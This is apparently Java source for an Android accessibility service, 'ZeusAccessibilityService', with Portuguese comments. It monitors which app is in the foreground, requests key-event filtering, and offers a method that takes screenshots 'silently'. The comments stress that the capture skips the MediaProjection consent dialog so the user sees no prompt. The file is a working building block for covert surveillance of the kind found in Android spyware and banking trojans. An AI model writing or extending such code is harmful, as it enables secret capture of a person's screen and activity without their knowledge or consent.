package com.zeusmob.app.service;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.graphics.Bitmap;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

/**
 * ZeusAccessibilityService
 *
 * Captura de tela silenciosa usando AccessibilityService.takeScreenshot()
 * (API 30+) — sem qualquer uso de MediaProjection e sem exibir diálogo
 * de "Iniciar Transmissão de Tela" ao usuário.
 */
public class ZeusAccessibilityService extends AccessibilityService {

    private static final String TAG = "ZeusAccessibility";

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes       = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType     = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags            = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
                              | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
                              | AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS;
        info.notificationTimeout = 100;
        setServiceInfo(info);
        Log.d(TAG, "ZeusAccessibilityService conectado");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        int type = event.getEventType();

        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            CharSequence pkg = event.getPackageName();
            if (pkg != null) {
                Log.d(TAG, "Janela ativa: " + pkg);
            }
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "ZeusAccessibilityService interrompido");
    }

    @Override
    public boolean onUnbind(Intent intent) {
        return true;
    }

    /**
     * Captura de tela silenciosa — API 30+.
     * Usa AccessibilityService.takeScreenshot(), que NÃO requer
     * MediaProjection nem exibe nenhum diálogo ao usuário.
     *
     * @param displayId  ID do display (use Display.DEFAULT_DISPLAY = 0)
     * @param callback   chamado com o Bitmap capturado, ou null em caso de falha
     */
    public void captureScreenSilently(int displayId, ScreenCaptureCallback callback) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            Log.w(TAG, "captureScreenSilently requer Android 11+ (API 30)");
            if (callback != null) callback.onCapture(null);
            return;
        }

        takeScreenshot(
            displayId,
            getMainExecutor(),
            new TakeScreenshotCallback() {
                @Override
                public void onSuccess(ScreenshotResult result) {
                    Bitmap bmp = Bitmap.wrapHardwareBuffer(
                        result.getHardwareBuffer(),
                        result.getColorSpace()
                    );
                    result.getHardwareBuffer().close();
                    Log.d(TAG, "Screenshot capturado silenciosamente");
                    new Handler(Looper.getMainLooper()).post(() -> {
                        if (callback != null) callback.onCapture(bmp);
                    });
                }

                @Override
                public void onFailure(int errorCode) {
                    Log.w(TAG, "Screenshot falhou — código: " + errorCode);
                    if (callback != null) callback.onCapture(null);
                }
            }
        );
    }

    public interface ScreenCaptureCallback {
        void onCapture(Bitmap bitmap);
    }
}
